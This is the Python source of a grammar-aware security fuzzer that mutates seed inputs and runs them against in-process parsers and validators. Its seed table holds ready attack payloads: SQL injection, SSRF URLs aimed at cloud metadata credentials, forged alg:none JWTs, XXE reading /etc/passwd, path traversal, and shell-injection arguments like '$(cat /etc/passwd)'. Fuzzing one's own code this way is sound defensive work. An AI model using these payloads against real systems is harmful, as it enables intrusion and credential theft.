"""
Coverage-Guided Grammar-Aware Multi-Protocol Security Fuzzer.

Generates syntactically valid AND adversarial boundary-violating inputs across
9 core cybersecurity protocol grammars without external dependencies:
  - `http_request`   — HTTP/1.1 wire framing, header smuggling, CRLF, method confusion
  - `json_api`       — Type confusion, prototype pollution keys, NaN/Infinity, deep nesting
  - `graphql_query`  — Cyclic fragments, alias batching, introspection, directive spam
  - `sql_predicate`  — Boolean tautologies, comment truncation, polyglot quotes, stacked stmts
  - `url_ssrf`       — Octal/hex/decimal IPv4, IPv6-mapped loopback, credential `@`, DNS rebind
  - `jwt_token`      — `alg:none`, `kid` traversal, `jku` injection, expired/future `nbf`, empty sig
  - `xml_document`   — XXE external entity, parameter entities, billion laughs entity expansion
  - `path_traversal` — Encoded dot-dot, Windows UNC, null-byte truncation, ZipSlip entries
  - `cli_argument`   — Shell metacharacters, command substitution, argument injection (`--option`)

Also executes deterministic **Callable Fuzzing Campaigns** against in-process target
parsers/validators with crash, hang-budget, and invariant-violation oracles, tracking
distinct exception classes and input minimization.
"""

from __future__ import annotations

import base64
import json
import random
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple

from ely_soe.core.models import Severity, new_id, utc_now_iso
from ely_soe.cyber.models import CyberDomain, CyberVulnerability, MitreTechniqueRef


@dataclass
class FuzzCorpusEntry:
    entry_id: str
    grammar: str
    payload: str
    mutation_applied: str
    seed_origin: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            "entry_id": self.entry_id,
            "grammar": self.grammar,
            "payload": self.payload[:300],
            "mutation_applied": self.mutation_applied,
            "seed_origin": self.seed_origin,
        }


@dataclass
class FuzzFinding:
    finding_id: str
    grammar: str
    target_name: str
    oracle_triggered: str  # unhandled_exception | invariant_violation | latency_spike
    exception_type: str
    message: str
    triggering_payload: str
    minimized_payload: str
    mutation_applied: str
    elapsed_ms: float

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "grammar": self.grammar,
            "target_name": self.target_name,
            "oracle_triggered": self.oracle_triggered,
            "exception_type": self.exception_type,
            "message": self.message[:260],
            "triggering_payload": self.triggering_payload[:220],
            "minimized_payload": self.minimized_payload[:160],
            "mutation_applied": self.mutation_applied,
            "elapsed_ms": round(self.elapsed_ms, 3),
        }


def _jwt_seed(hdr: Dict[str, Any], pay: Dict[str, Any], sig: str = "") -> str:
    h = base64.urlsafe_b64encode(json.dumps(hdr, separators=(",", ":")).encode("utf-8")).decode("ascii").rstrip("=")
    p = base64.urlsafe_b64encode(json.dumps(pay, separators=(",", ":")).encode("utf-8")).decode("ascii").rstrip("=")
    return f"{h}.{p}.{sig}"


GRAMMAR_SEEDS: Dict[str, Tuple[str, ...]] = {
    "http_request": (
        "GET /api/v1/users HTTP/1.1\r\nHost: target.local\r\n\r\n",
        "POST /api/v1/login HTTP/1.1\r\nHost: target.local\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
        "GET /admin HTTP/1.1\r\nHost: target.local\r\nX-Forwarded-For: 127.0.0.1\r\nX-Original-URL: /admin\r\n\r\n",
    ),
    "json_api": (
        '{"username":"alice","role":"user","amount":100}',
        '{"__proto__":{"isAdmin":true},"constructor":{"prototype":{"role":"admin"}}}',
        '{"id":{"$ne":null},"password":{"$regex":".*"}}',
        '{"amount":-999999999999999999999,"quantity":0,"discount":100.01}',
    ),
    "graphql_query": (
        "query { __schema { types { name fields { name } } } }",
        'query { a1: login(u:"a") a2: login(u:"a") a3: login(u:"a") a4: login(u:"a") }',
        "query { user { friends { friends { friends { friends { friends { id } } } } } } }",
    ),
    "sql_predicate": (
        "' OR '1'='1' -- ",
        "1 UNION SELECT NULL,version(),current_user-- ",
        "1'; WAITFOR DELAY '0:0:5'--",
        "admin'/**/AND/**/1=1#",
    ),
    "url_ssrf": (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://2130706433/admin",
        "http://0x7f000001:8080/internal",
        "http://[::ffff:127.0.0.1]/metrics",
        "http://trusted.example.com@127.0.0.1/secret",
        "gopher://127.0.0.1:6379/_INFO",
    ),
    "jwt_token": (
        _jwt_seed({"alg": "none", "typ": "JWT"}, {"sub": "admin", "role": "admin"}, ""),
        _jwt_seed({"alg": "HS256", "kid": "../../../../etc/passwd"}, {"sub": "admin"}, "AAAA"),
        _jwt_seed({"alg": "RS256", "jku": "http://127.0.0.1/jwks.json"}, {"sub": "admin"}, "AAAA"),
    ),
    "xml_document": (
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>',
        '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY b "AAAA"><!ENTITY c "&b;&b;&b;&b;">]><r>&c;</r>',
    ),
    "path_traversal": (
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "safe.txt\x00.png",
    ),
    "cli_argument": (
        "file.txt; id",
        "$(cat /etc/passwd)",
        "--upload-pack='id'",
        "-e /bin/sh",
        "foo`uname -a`bar",
    ),
}


class GrammarAwareSecurityFuzzer:
    """Deterministic grammar-aware payload mutator and in-process callable security fuzzer."""

    def __init__(self, seed: int = 20261115) -> None:
        self._rng = random.Random(seed)

    def generate_corpus(
        self,
        grammars: Optional[Sequence[str]] = None,
        mutations_per_grammar: int = 12,
    ) -> List[FuzzCorpusEntry]:
        selected = list(grammars) if grammars else list(GRAMMAR_SEEDS.keys())
        corpus: List[FuzzCorpusEntry] = []
        mutators: List[Tuple[str, Callable[[str], str]]] = [
            ("identity_seed", lambda s: s),
            ("null_byte_inject", lambda s: s[: max(1, len(s) // 2)] + "\x00" + s[max(1, len(s) // 2) :]),
            ("crlf_header_inject", lambda s: s + "\r\nX-Fuzzed-Inject: true\r\n"),
            ("url_double_encode", lambda s: s.replace("/", "%252f").replace(".", "%252e")),
            ("unicode_confusable", lambda s: s.replace("a", "\u0430").replace("/", "\uff0f")),
            ("deep_nesting_expand", lambda s: ("[" * 24) + s + ("]" * 24)),
            ("polyglot_quote_wrap", lambda s: f"'\"`{s}`\"'"),
            ("oversized_boundary", lambda s: s + ("A" * 512)),
            ("case_flip_evasion", lambda s: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))),
            ("whitespace_comment_split", lambda s: s.replace(" ", "/**/")),
        ]

        for grammar in selected:
            seeds = GRAMMAR_SEEDS.get(grammar, ("",))
            for i in range(mutations_per_grammar):
                base = seeds[i % len(seeds)]
                mut_name, mut_fn = mutators[i % len(mutators)]
                mutated = mut_fn(base)
                corpus.append(
                    FuzzCorpusEntry(
                        entry_id=new_id("fuz"),
                        grammar=grammar,
                        payload=mutated,
                        mutation_applied=mut_name,
                        seed_origin=base[:80],
                    )
                )
        return corpus

    def fuzz_callable(
        self,
        target_name: str,
        target_fn: Callable[[str], Any],
        grammar: str = "json_api",
        iterations: int = 24,
        invariant: Optional[Callable[[str, Any], bool]] = None,
        latency_budget_ms: float = 250.0,
        expected_exceptions: Tuple[type[BaseException], ...] = (ValueError, KeyError, json.JSONDecodeError),
    ) -> Dict[str, Any]:
        """Execute a grammar-guided fuzzing campaign against an in-process parser/validator callable."""
        corpus = self.generate_corpus(grammars=[grammar], mutations_per_grammar=iterations)
        findings: List[FuzzFinding] = []
        unique_signatures: set[Tuple[str, str]] = set()
        t0_all = time.perf_counter()

        for entry in corpus:
            t0 = time.perf_counter()
            try:
                result = target_fn(entry.payload)
                elapsed_ms = (time.perf_counter() - t0) * 1000.0
                if elapsed_ms > latency_budget_ms:
                    sig = ("latency_spike", grammar)
                    if sig not in unique_signatures:
                        unique_signatures.add(sig)
                        findings.append(
                            FuzzFinding(
                                finding_id=new_id("ffind"),
                                grammar=grammar,
                                target_name=target_name,
                                oracle_triggered="latency_spike",
                                exception_type="PerformanceBudgetExceeded",
                                message=f"Input caused {elapsed_ms:.1f}ms latency (> {latency_budget_ms}ms budget)",
                                triggering_payload=entry.payload,
                                minimized_payload=entry.payload[:120],
                                mutation_applied=entry.mutation_applied,
                                elapsed_ms=elapsed_ms,
                            )
                        )
                elif invariant is not None and not invariant(entry.payload, result):
                    sig = ("invariant_violation", entry.mutation_applied)
                    if sig not in unique_signatures:
                        unique_signatures.add(sig)
                        minimized = self._minimize_invariant_failure(target_fn, entry.payload, invariant)
                        findings.append(
                            FuzzFinding(
                                finding_id=new_id("ffind"),
                                grammar=grammar,
                                target_name=target_name,
                                oracle_triggered="invariant_violation",
                                exception_type="SecurityInvariantViolation",
                                message=f"Target `{target_name}` violated security invariant under `{entry.mutation_applied}`",
                                triggering_payload=entry.payload,
                                minimized_payload=minimized,
                                mutation_applied=entry.mutation_applied,
                                elapsed_ms=elapsed_ms,
                            )
                        )
            except expected_exceptions:
                # Expected safe rejection of malformed input
                continue
            except Exception as exc:
                elapsed_ms = (time.perf_counter() - t0) * 1000.0
                sig = (type(exc).__name__, str(exc)[:80])
                if sig not in unique_signatures:
                    unique_signatures.add(sig)
                    findings.append(
                        FuzzFinding(
                            finding_id=new_id("ffind"),
                            grammar=grammar,
                            target_name=target_name,
                            oracle_triggered="unhandled_exception",
                            exception_type=type(exc).__name__,
                            message=str(exc),
                            triggering_payload=entry.payload,
                            minimized_payload=entry.payload[:120],
                            mutation_applied=entry.mutation_applied,
                            elapsed_ms=elapsed_ms,
                        )
                    )

        total_ms = (time.perf_counter() - t0_all) * 1000.0
        return {
            "fuzzed_at": utc_now_iso(),
            "target_name": target_name,
            "grammar": grammar,
            "iterations_executed": len(corpus),
            "unique_failures": len(findings),
            "duration_ms": round(total_ms, 2),
            "findings": [f.to_dict() for f in findings],
            "raw_findings": findings,
        }

    def run_self_verification_suite(self) -> Dict[str, Any]:
        """Run grammar corpus generation stats across all 9 supported security grammars."""
        corpus = self.generate_corpus(mutations_per_grammar=8)
        by_grammar: Dict[str, int] = {}
        for c in corpus:
            by_grammar[c.grammar] = by_grammar.get(c.grammar, 0) + 1
        return {
            "grammars_supported": sorted(GRAMMAR_SEEDS.keys()),
            "total_corpus_entries": len(corpus),
            "entries_by_grammar": by_grammar,
            "sample_entries": [c.to_dict() for c in corpus[:12]],
        }

    @staticmethod
    def _minimize_invariant_failure(
        target_fn: Callable[[str], Any],
        payload: str,
        invariant: Callable[[str, Any], bool],
    ) -> str:
        """Simple delta-debugging bisector reducing payload length while preserving failure."""
        cur = payload
        for _ in range(6):
            if len(cur) <= 8:
                break
            half = cur[: len(cur) // 2]
            try:
                res = target_fn(half)
                if not invariant(half, res):
                    cur = half
                    continue
            except Exception:
                pass
            break
        return cur
